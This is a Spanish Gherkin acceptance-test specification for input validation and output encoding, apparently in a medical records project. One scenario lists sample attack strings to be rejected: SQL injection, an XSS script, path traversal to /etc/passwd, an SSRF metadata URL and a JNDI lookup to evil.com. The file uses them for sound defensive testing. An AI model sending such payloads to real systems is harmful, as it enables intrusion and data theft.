# language: es
# Secure by Design - Input/Output Security
@status:proposed
@type:acceptance
@domain:general
# SEGURIDAD EN ENTRADA/SALIDA: Validar entrada, codificar salida
Característica: Seguridad de Entrada/Salida (Secure by Design - GHE)
  Como desarrollador del proyecto GHE
  Quiero validar toda la entrada y codificar toda la salida
  Para prevenir inyecciones y manipulaciones

  # ─────────────────────────────────────────────────────────────
  # 1. VALIDACIÓN DE ENTRADA
  # ─────────────────────────────────────────────────────────────

  Escenario: Validación de entrada por tipo de campo
    Dado que se valida cada tipo de campo
    Cuando se procesa input
    Entonces:
      | Campo                      | Validación            |
      | CURP                       | Regex 18 chars, uppercase |
      | Nombre                     | Solo letras, 1-100    |
      | Teléfono                   | Solo números, 10 chars|
      | Email                      | Formato válido        |
      | Fecha                      | Formato ISO 8601      |
      | Cantidad medicamento       | Número positivo       |
      | Dosis                      | Formato válido        |
      | Código CIE-10              | Formato válido        |

  Escenario: Rechazo de input malicioso
    Dado que se recibe input potencialmente malicioso
    Cuando se procesa
    Entonces:
      | Input                      | Acción                |
      | "'; DROP TABLE patients;--"| Rechazar (SQL inj.)  |
      | "<script>alert('XSS')</script>" | Rechazar (XSS)  |
      | "../../etc/passwd"         | Rechazar (path traversal) |
      | "http://169.254.169.254"  | Rechazar (SSRF)       |
      | "${jndi:ldap://evil.com}" | Rechazar (JNDI)       |

  # ─────────────────────────────────────────────────────────────
  # 2. OUTPUT ENCODING
  # ─────────────────────────────────────────────────────────────

  Escenario: Codificación de salida por contexto
    Dado que se renderiza output
    Cuando se muestra al usuario
    Entonces:
      | Contexto                   | Codificación         |
      | HTML                       | & < > " ' codificados |
      | JavaScript                 | Escape de caracteres especiales |
      | URL                        | % encoding           |
      | CSS                        | Unicode escape       |
      | JSON                       | JSON encoding        |
      | XML                        | XML entity encoding  |

  Escenario: Prevención de XSS
    Dado que se previene XSS
    Cuando se muestra contenido del usuario
    Entonces:
      | Medida                      | Estado    |
      | HTML entity encoding        | ✅         |
      | Content Security Policy     | ✅         |
      | X-Content-Type-Options      | ✅         |
      | X-XSS-Protection            | ✅         |
      | HttpOnly cookies            | ✅         |

  # ─────────────────────────────────────────────────────────────
  # 3. SANITIZACIÓN
  # ─────────────────────────────────────────────────────────────

  Escenario: Sanitización de datos médicos
    Dado que se procesan datos médicos
    Cuando se sanitizan
    Entonces:
      | Dato                        | Sanitización         |
      | Notas clínicas (texto libre)| Strip de HTML tags   |
      | Diagnósticos               | Validar CIE-10       |
      | Medicamentos               | Validar vademécum    |
      | Instrucciones              | Strip de scripts     |

  Escenario: Upload de archivos (futuro)
    Dado que se permite upload de archivos
    Cuando se valida
    Entonces:
      | Criterio                   | Estado    |
      | Tipo MIME permitido        | Whitelist |
      | Tamaño máximo              | Limitado  |
      | Extensión verificada       | ✅         |
      | Contenido verificado       | ✅         |
      | Archivo renombrado         | ✅         |
      | Almacenado fuera de web root | ✅       |
  